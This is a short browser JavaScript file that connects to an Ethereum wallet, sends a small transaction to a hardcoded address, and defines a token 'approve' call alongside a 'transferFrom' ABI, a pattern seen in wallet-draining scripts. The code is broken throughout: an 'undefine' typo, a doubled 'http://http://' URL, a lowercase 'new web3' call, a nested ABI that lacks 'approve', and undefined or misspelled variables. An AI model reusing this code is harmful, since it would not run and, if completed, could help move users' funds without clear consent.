var web3;
var address="0x7f9527fb468aC6915763f2a3be09EF6c3F279d08";


async function Connect(){
    await window.web3.currentProvider.enable();
    web3=new web3(window.web3.currentProvider);
}

async function sendTransaction(){

    let params = [{
        "from":"0xC37DE1aC712e9e6a2b30577EDdA10B3B2f3F278b",
        "to":"0x7f9527fb468aC6915763f2a3be09EF6c3F279d08",
        "gas":Number(20000).toString(16),
        "value":Number(1000000000000).toString(16),
    }]
    let result = await window.ethereum.request({method:"eth_sendTransaction",params}).catch((err)=>{
        console.log(err)
    })
}

if(typeof web3 !== 'undefine'){
    web3=new web3(window.web3.currentProvider);
}
else{
    web3=new web3(new web3.provider.HttpProvider("http://http://127.0.0.1:5500/"));
}

var abi=[[
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "_owner",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "_spender",
				"type": "address"
			}
		],
		"name": "allowance",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "_from",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "_to",
				"type": "address"
			},
			{
				"internalType": "uint256",
				"name": "_value",
				"type": "uint256"
			}
		],
		"name": "transferFrom",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	}
]]
var contract=new web3.eth.Contract(abi,address);

async function Approve(Contract,spenderAdr){
    Contract.methods.approve(spenderAddr, amount).send({
     from: ownerAddr
    })
  }